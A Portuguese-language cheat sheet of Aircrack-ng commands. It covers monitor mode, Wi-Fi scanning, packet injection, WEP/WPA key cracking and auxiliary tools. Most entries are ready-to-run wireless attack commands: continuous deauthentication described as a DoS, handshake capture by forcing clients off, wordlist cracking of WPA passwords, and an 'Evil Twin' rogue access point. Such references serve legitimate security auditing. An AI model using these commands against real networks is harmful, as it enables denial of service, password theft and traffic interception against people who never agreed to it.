# GUIA RÁPIDO DO AIRCRACK-NG - COMANDOS ESSENCIAIS

## 1. Gestão da Placa de Rede (Airmon-ng)
airmon-ng - Listar as placas de rede sem fios detetadas pelo sistema.
airmon-ng check - Verificar e listar processos que podem interferir com a placa de rede.
airmon-ng check kill - Matar todos os processos que possam interferir com o modo monitor.
airmon-ng start wlan0 - Ativar o modo monitor na interface de rede "wlan0".
airmon-ng start wlan0 6 - Ativar o modo monitor fixando a placa apenas no canal 6.
airmon-ng stop wlan0mon - Desativar o modo monitor e voltar ao modo gerido (normal).

## 2. Captura de Pacotes e Reconhecimento (Airodump-ng)
airodump-ng wlan0mon - Escanear o ambiente e listar todas as redes Wi-Fi e clientes próximos.
airodump-ng --band a wlan0mon - Escanear redes especificamente na banda de 5 GHz.
airodump-ng -c 11 wlan0mon - Capturar tráfego fixando a placa apenas no canal 11.
airodump-ng --bssid 00:11:22:33:44:55 wlan0mon - Filtrar a captura apenas por um ponto de acesso (BSSID) específico.
airodump-ng --bssid 00:11:22:33:44:55 -c 1 -w captura wlan0mon - Capturar dados de uma rede no canal 1 e salvar num ficheiro prefixado como "captura".
airodump-ng --essid "NomeDaRede" wlan0mon - Filtrar a captura pelo nome da rede (ESSID).
airodump-ng --wps wlan0mon - Mostrar informações sobre redes com o protocolo WPS ativado.
airodump-ng --manufacturer wlan0mon - Exibir o fabricante do hardware com base no endereço MAC.

## 3. Injeção de Pacotes e Ataques (Aireplay-ng)
aireplay-ng --test wlan0mon - Testar se a tua placa de rede consegue injetar pacotes com sucesso no ambiente.
aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon - Enviar 5 pacotes de desautenticação (Deauth) para desconectar todos os clientes da rede.
aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon - Enviar pacotes de desautenticação continuamente (ataque DoS na rede).
aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon - Desautenticar um cliente específico ligado a essa rede para capturar o Handshake.
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon - Realizar uma falsa autenticação num ponto de acesso (útil para redes WEP).
aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -f 1 wlan0mon - Ataque de reprodução interativa de pacotes (Interactive Packet Replay).
aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:AA:BB:CC:DD:EE wlan0mon - Ataque de replicação de requisições ARP para gerar tráfego rápido em redes WEP.

## 4. Quebra de Chaves e Auditoria (Aircrack-ng)
aircrack-ng captura-01.cap - Tentar quebrar uma chave WEP simples com base nos pacotes capturados.
aircrack-ng -w wordlist.txt captura-01.cap - Tentar quebrar a senha de uma rede WPA/WPA2 usando uma lista de palavras (Handshake necessário).
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 captura-01.cap - Direcionar a quebra do Handshake apenas para o BSSID especificado.
aircrack-ng -w wordlist.txt -e "NomeDaRede" captura-01.cap - Direcionar a quebra do Handshake filtrando pelo nome da rede (ESSID).
aircrack-ng -e "NomeDaRede" -J formato_john captura-01.cap - Converter a captura de Handshake para um formato compatível com a ferramenta John the Ripper.

## 5. Ferramentas Auxiliares (Airbase-ng / Airdecap-ng)
airbase-ng -e "Wi-Fi_Gratis" -c 6 wlan0mon - Criar um ponto de acesso falso (Rogue AP / Evil Twin) com o nome especificado no canal 6.
airdecap-ng -w 12345678 captura.cap - Desencriptar um ficheiro de captura WPA sabendo previamente a senha da rede ("12345678").
airdecap-ng -e "NomeDaRede" -p 12345678 captura.cap - Desencriptar o ficheiro de captura usando o nome da rede e a senha.
